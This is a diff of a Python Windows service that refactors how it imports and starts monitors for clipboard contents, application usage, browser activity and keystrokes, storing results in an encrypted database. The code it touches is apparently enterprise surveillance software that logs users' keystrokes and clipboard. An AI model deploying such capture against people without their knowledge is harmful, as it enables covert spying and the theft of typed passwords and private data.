@@ -28,7 +28,7 @@ import os
 import subprocess
 import pywintypes
 
-# Add project root to path
+# Add project root to path - MUST be first
 current_dir = Path(__file__).parent
 project_root = current_dir.parent
 sys.path.insert(0, str(project_root))
@@ -72,6 +72,29 @@ logging.basicConfig(
 
 logger = logging.getLogger(__name__)
 
+# Import monitoring components at module level (after logging setup)
+# This prevents import errors when running as Windows service
+try:
+    from clipboard_monitor import ClipboardMonitor
+    from enterprise.app_usage_tracker import ApplicationUsageTracker
+    from enterprise.browser_tracker import BrowserActivityTracker
+    from enterprise.database_manager import DatabaseManager
+    from enterprise.keystroke_recorder import KeystrokeRecorder
+    from enterprise.config import Config
+    IMPORTS_AVAILABLE = True
+    logger.info("Successfully imported all monitoring components")
+except ImportError as e:
+    logger.error(f"Warning: Could not import monitoring components: {e}")
+    logger.error("Service will start but monitors may not be available")
+    IMPORTS_AVAILABLE = False
+    # Define dummy classes to prevent errors
+    ClipboardMonitor = None
+    ApplicationUsageTracker = None
+    BrowserActivityTracker = None
+    DatabaseManager = None
+    KeystrokeRecorder = None
+    Config = None
+
 
 # ============================================================================
 # MONITORING ENGINE
@@ -88,84 +111,76 @@ class MonitoringEngine:
         
         logger.info("Initializing monitoring engine...")
         
-        # Import monitoring components
-        try:
-            from clipboard_monitor import ClipboardMonitor
-            from enterprise.app_usage_tracker import ApplicationUsageTracker
-            from enterprise.browser_tracker import BrowserActivityTracker
-            from enterprise.database_manager import DatabaseManager
-            from enterprise.keystroke_recorder import KeystrokeRecorder
-            from enterprise.config import Config
-            
-            # Load config if not provided
-            if self.config is None:
-                try:
-                    self.config = Config()
-                except Exception as e:
-                    logger.error(f"Error loading config: {e}")
-                    self.config = None
-            
-            # Initialize database
+        # Check if imports are available
+        if not IMPORTS_AVAILABLE:
+            logger.error("Monitoring components not available - imports failed at module level")
+            raise ImportError("Required monitoring components could not be imported")
+        
+        # Load config if not provided
+        if self.config is None:
             try:
-                db_path = get_database_path()
-                db_path.parent.mkdir(parents=True, exist_ok=True)
-                self.db = DatabaseManager(db_path, enable_encryption=True)
-                logger.info(f"Database initialized at {db_path}")
+                self.config = Config()
             except Exception as e:
-                logger.error(f"Error initializing database: {e}")
-                raise
-            
-            # Initialize monitors based on config
-            if self._is_monitor_enabled('clipboard'):
-                try:
-                    self.clipboard_monitor = ClipboardMonitor(
-                        callback=self.on_clipboard_event,
-                        polling_interval=0.5
-                    )
-                    self.monitors.append(('clipboard', self.clipboard_monitor))
-                    logger.info("Clipboard monitor initialized")
-                except Exception as e:
-                    logger.error(f"Error initializing clipboard monitor: {e}")
-            
-            if self._is_monitor_enabled('applications'):
-                try:
-                    self.app_tracker = ApplicationUsageTracker(
-                        callback=self.on_app_usage_event
-                    )
-                    self.monitors.append(('app_usage', self.app_tracker))
-                    logger.info("Application tracker initialized")
-                except Exception as e:
-                    logger.error(f"Error initializing application tracker: {e}")
-            
-            if self._is_monitor_enabled('browser'):
-                try:
-                    self.browser_tracker = BrowserActivityTracker(
-                        callback=self.on_browser_event
-                    )
-                    self.monitors.append(('browser', self.browser_tracker))
-                    logger.info("Browser tracker initialized")
-                except Exception as e:
-                    logger.error(f"Error initializing browser tracker: {e}")
-            
-            if self._is_monitor_enabled('keystrokes'):
-                try:
-                    keystroke_config = self.config.get('keystrokes', {}) if self.config else {}
-                    self.keystroke_recorder = KeystrokeRecorder(
-                        storage_dir=get_keystroke_storage_dir(),
-                        callback=self.on_keystroke_event,
-                        enable_encryption=keystroke_config.get('encryption_enabled', True),
-                        buffer_flush_interval=keystroke_config.get('buffer_flush_interval', 60)
-                    )
-                    self.monitors.append(('keystrokes', self.keystroke_recorder))
-                    logger.info("Keystroke recorder initialized")
-                except Exception as e:
-                    logger.error(f"Error initializing keystroke recorder: {e}")
-            
-            logger.info(f"Monitoring engine initialized with {len(self.monitors)} monitors")
-            
-        except ImportError as e:
-            logger.error(f"Error importing monitoring components: {e}")
+                logger.error(f"Error loading config: {e}")
+                self.config = None
+        
+        # Initialize database
+        try:
+            db_path = get_database_path()
+            db_path.parent.mkdir(parents=True, exist_ok=True)
+            self.db = DatabaseManager(db_path, enable_encryption=True)
+            logger.info(f"Database initialized at {db_path}")
+        except Exception as e:
+            logger.error(f"Error initializing database: {e}")
             raise
+        
+        # Initialize monitors based on config
+        if self._is_monitor_enabled('clipboard'):
+            try:
+                self.clipboard_monitor = ClipboardMonitor(
+                    callback=self.on_clipboard_event,
+                    polling_interval=0.5
+                )
+                self.monitors.append(('clipboard', self.clipboard_monitor))
+                logger.info("Clipboard monitor initialized")
+            except Exception as e:
+                logger.error(f"Error initializing clipboard monitor: {e}")
+        
+        if self._is_monitor_enabled('applications'):
+            try:
+                self.app_tracker = ApplicationUsageTracker(
+                    callback=self.on_app_usage_event
+                )
+                self.monitors.append(('app_usage', self.app_tracker))
+                logger.info("Application tracker initialized")
+            except Exception as e:
+                logger.error(f"Error initializing application tracker: {e}")
+        
+        if self._is_monitor_enabled('browser'):
+            try:
+                self.browser_tracker = BrowserActivityTracker(
+                    callback=self.on_browser_event
+                )
+                self.monitors.append(('browser', self.browser_tracker))
+                logger.info("Browser tracker initialized")
+            except Exception as e:
+                logger.error(f"Error initializing browser tracker: {e}")
+        
+        if self._is_monitor_enabled('keystrokes'):
+            try:
+                keystroke_config = self.config.get('keystrokes', {}) if self.config else {}
+                self.keystroke_recorder = KeystrokeRecorder(
+                    storage_dir=get_keystroke_storage_dir(),
+                    callback=self.on_keystroke_event,
+                    enable_encryption=keystroke_config.get('encryption_enabled', True),
+                    buffer_flush_interval=keystroke_config.get('buffer_flush_interval', 60)
+                )
+                self.monitors.append(('keystrokes', self.keystroke_recorder))
+                logger.info("Keystroke recorder initialized")
+            except Exception as e:
+                logger.error(f"Error initializing keystroke recorder: {e}")
+        
+        logger.info(f"Monitoring engine initialized with {len(self.monitors)} monitors")
     
     def _is_monitor_enabled(self, monitor_name: str) -> bool:
         """Check if a monitor is enabled in config"""
